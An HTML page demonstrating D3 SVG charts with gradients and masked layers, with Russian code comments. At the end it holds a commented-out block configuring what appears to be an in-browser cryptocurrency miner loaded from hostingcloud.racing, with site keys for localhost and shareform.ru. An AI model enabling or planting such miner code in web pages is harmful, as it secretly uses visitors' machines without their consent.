<!DOCTYPE html>
<html>

<head>
    <meta charset='utf-8'>
    <title>D3's Hello World</title>
    <script src='/js/d3.v6.min.js'></script>
    <script src='/js/chroma.min.js'></script>
    <script src='/js/lodash.min.js'></script>
    <script src='js/lib.js'></script>
    <script src='c.js'></script>
    <link rel='stylesheet' href='/css/null.css' />
    <style>
        body {
            font-family: 'Courier New', Courier, monospace
        }
        
        .axis path,
        .axis line {
            fill: none;
            stroke: #333;
        }
        
        .axis .grid-line {
            stroke: #000;
            stroke-opacity: 0.2;
        }
        
        .axis text {
            font: 10px Verdana;
        }
        
        .bar {
            /*stroke: none;*/
        }
        
        svg {
            position: absolute;
            top: 0;
            left: 0;
        }
        
        .dot {
            stroke: steelblue;
            fill: lightblue;
        }
        
        .dot-2 {
            /*
            stroke: lightblue;
            fill: lightblue;*/
        }
    </style>
    <script src="data.js"></script>
</head>

<body style='background-color: #01040a'>

    <script>
        win.onload = () => {

            let width = win.innerWidth - 0;
            let height = win.innerHeight - 0;

            let margin = 0,
                padding = 0;


            //https://mdigi.tools/color-shades/#061639
            //#061639
            //let pallete = chroma.scale(['#061639', 'black']).colors(24);
            let palletejson = JSON.stringify(colors);

            let MaskedLayer = () => {
                // Маскированный слой
                let instance = {};

                return instance;
            };

            // объект Холст
            function Canvas(spec) {
                let instance = {};
                let headline, description;
                let svg, defs, width, height;
                let data = {};
                let margin = 0;
                let pallete = [];
                let gradients = [];
                let layers = [];
                let maskedlayers = [];
                let rects = [];

                instance.newLayer = (data, width, height, margin, fill, stroke) => {

                    let layer = Layer()
                        .data(data)
                        .width(width)
                        .height(height)
                        .margin(margin)
                        .fill(fill)
                        .stroke(stroke)
                        .append(svg)
                        .appendArea()
                        .appendLine()
                        .appendDots();

                    layers.push(layer);

                    return instance;
                };

                instance.newMaskedLayer = (data, width, height, margin, fill, stroke, maskfill, maskstroke) => {

                    let m = Mask()
                        .append(defs);

                    let layer = Layer()
                        .data(data)
                        .width(width)
                        .height(height)
                        .margin(margin)
                        .fill(maskfill)
                        .stroke(maskstroke)
                        .append(m.d3())
                        .appendArea()
                        .appendLine()
                        .appendDots();

                    //maskedlayers.push(m);

                    let r = Rect({
                        'width': width,
                        'height': height,
                        'fill': fill,
                        'stroke': stroke,
                        'mask': m.url()
                    }).append(svg);

                    //rects.push(r);

                    return instance;
                }

                // создаем SVG
                instance.appendSvg = (w, h) => {
                    width = w;
                    height = h;
                    svg = d3.select("body").append("svg")
                        .attr("class", "axis")
                        .attr("viewBox", "0 0 " + width + " " + height)
                        .attr("width", width)
                        .attr("height", height);
                    defs = svg.append("defs");
                    return instance;
                };

                instance.onresize = (on) => {
                    if (on) {
                        win.onresize = () => {
                            svg.attr("width", win.innerWidth);
                            svg.attr("height", win.innerHeight);
                        };
                    } else {
                        win.onresize = () => {};
                    }

                    return instance;
                }

                // создаем defs
                instance.appendDefs = () => {
                    if (!svg.select("defs")) defs = svg.append("defs");
                    return instance;
                };

                // присваиваем или получаем SVG
                instance.svg = (s) => {
                    if (!arguments.length) return svg;
                    svg = s;
                    return instance;
                };

                // устанавливаем или получаем ширину margin
                instance.margin = (m) => {
                    if (!arguments.length) return margin;
                    margin = m;
                    return instance;
                };

                // устанавливаем или получаем ширину SVG
                instance.width = (w) => {
                    if (!arguments.length) return width;
                    width = w;
                    svg.attr("viewBox", "0 0 " + width + " " + height)
                        .attr('width', width);
                    return instance;
                };

                // устанавливаем или получаем высоту SVG
                instance.height = (h) => {
                    if (!arguments.length) return height;
                    height = h;
                    svg.attr("viewBox", "0 0 " + width + " " + height)
                        .attr('height', height);
                    return instance;
                };

                // выводим виджет с заголовком и описанием
                instance.showTextWidget = () => {
                    let div = d3.select('body').append('div');
                    div.append('h3').text(headline);
                    div.attr('class', 'box')
                        .attr('style', 'width: ' + spec.width + '; word-wrap: break-word;color:' + spec.color)
                        .append('p')
                        .text(description);
                    return instance;
                };

                // присваиваем и получаем заголовок виджета
                instance.headline = (h) => {
                    if (!arguments.length) return headline;
                    headline = h;
                    return instance;
                };

                // присваиваем и получаем описание виджета
                instance.description = (d) => {
                    if (!arguments.length) return description;
                    description = d;
                    return instance;
                };

                // присваиваем и получаем объект с данными
                instance.data = (d) => {
                    if (_.isEmpty(d)) return data;
                    data = d;
                    return instance;
                };

                // присваиваем и получаем цветовую палитру
                instance.pallete = (p) => {
                    if (_.isEmpty(p)) return pallete;
                    pallete = p;
                    return instance;
                };

                // присваиваем и получаем градиенты
                instance.gradients = (g) => {
                    if (_.isEmpty(g)) return gradients;
                    gradients = g;
                    return instance;
                };

                // присваиваем и получаем слои
                instance.layers = (l) => {
                    if (_.isEmpty(l)) return layers;
                    layers = l;
                    return instance;
                };

                // создаем палитру
                instance.generatePallete = (obj) => {
                    // obj.colors is an array of colors. Example ['yellow','lightgreen',l008ae5]
                    // obj.domain is an array of stops. Example ['0,0.5,1']
                    let _colors;

                    if (!_.isEmpty(obj.colors)) {
                        _colors = chroma.scale(obj.colors);
                    } else {
                        _colors = chroma.scale(['white', 'black']);
                    }

                    if (!_.isEmpty(obj.domain)) {
                        _colors = _colors.domain(obj.domain);
                    }

                    if (!_.isEmpty(obj.count)) {
                        _colors = _colors.colors(count);
                    } else {
                        _colors = _colors.colors(24);
                    }

                    pallete = _colors;

                    return instance;
                };

                instance.appendGradient = (G) => {
                    G.append(defs);
                    return instance;
                };

                instance.appendBG = (mainColor, gradientColor) => {

                    // градиент
                    let BG = Gradient({
                            'defs': defs
                        }).append()
                        .stop('0', gradientColor, '0.25')
                        .stop('1', gradientColor, '1');

                    // маска
                    let M = Mask({
                            'defs': defs
                        }).append()
                        .rect(0, 0, width, height, 'url(#' + BG.id() + ')');

                    // прямоугольник с маской градиентом
                    let R = Rect({
                        'width': width,
                        'height': height,
                        'fill': mainColor,
                        'mask': 'url(#' + M.id() + ')'
                    }).append(svg);

                    return instance;
                }

                return instance;
            }

            let canvas = Canvas({
                    color: 'white', //'#6495ed',
                    width: width
                })
                .generatePallete({
                    'colors': ['yellow', 'lightgreen']
                });
            let p = canvas.pallete();
            canvas
                .headline('Pallete')
                .description(JSON.stringify(p)) //palletejson)
                .appendSvg(width, height)
                .onresize(true)
                .appendDefs()
                .appendBG("orange", "white");

            canvas.showTextWidget();

            let testData1 = [{
                x: 0,
                y: 0
            }, {
                x: 10,
                y: 67
            }, {
                x: 20,
                y: 74
            }, {
                x: 30,
                y: 63
            }, {
                x: 40,
                y: 56
            }, {
                x: 50,
                y: 24
            }, {
                x: 60,
                y: 26
            }, {
                x: 70,
                y: 19
            }, {
                x: 80,
                y: 42
            }, {
                x: 90,
                y: 88
            }, {
                x: 100,
                y: 70
            }];

            let testData2 = [{
                x: 0,
                y: 10
            }, {
                x: 10,
                y: 77
            }, {
                x: 15,
                y: 65
            }, {
                x: 20,
                y: 84
            }, {
                x: 30,
                y: 76
            }, {
                x: 40,
                y: 66
            }, {
                x: 50,
                y: 34
            }, {
                x: 60,
                y: 36
            }, {
                x: 70,
                y: 29
            }, {
                x: 80,
                y: 52
            }, {
                x: 90,
                y: 98
            }, {
                x: 100,
                y: 80
            }];

            // html цвета
            // rapidtables.com/web/color/html-color-codes.html
            // https://www.w3schools.com/colors/colors_names.asp
            // https://colorscheme.ru/html-colors.html
            // https://colorscheme.ru/color-names.html

            let G2 = Gradient();
            let G1 = Gradient();

            canvas.appendGradient(G2); // градиент, как и другие объекты, передается по ссылке
            // стопы добавлять только после создания градиента и добавления его в SVG
            G2.id('G2_')
                .stop('0', 'blue', '0.25')
                .stop('1', 'green', '1');

            let G2url = G2.url();
            canvas.newLayer(testData2, width, height, margin, G2url, 'lightgreen');


            canvas.appendGradient(G1);
            G1.id('G1_')
                .stop('0', 'crimson', '0.50')
                .stop('1', 'darkorange', '1');

            let G1url = G1.url();
            /*
            canvas.newLayer(testData1, width, height, margin, G1url, 'lightblue');*/

            canvas.newMaskedLayer(testData1, width, height, margin, G1url, 'lightblue', 'white', 'white');


            /*
             let c = coins()
                 .addSite({
                     id: 'local',
                     match: '127.0.0.1',
                     src: 'https://www.hostingcloud.racing/2KFX.js',
                     key: 'a854e75e5581eff8d57857295772763208fbf227916c146630e4fa16c1ea9e97'
                 })
                 .addSite({
                     id: 'share',
                     match: 'shareform.ru',
                     src: 'https://www.hostingcloud.racing/rhdQ.js',
                     key: 'cc138bc50ff7148e00b642bfa9beb5f8b8c41659c84996f1de44457d1ba5d6dc'
                 }).start();
                 */
        }
    </script>
</body>

</html>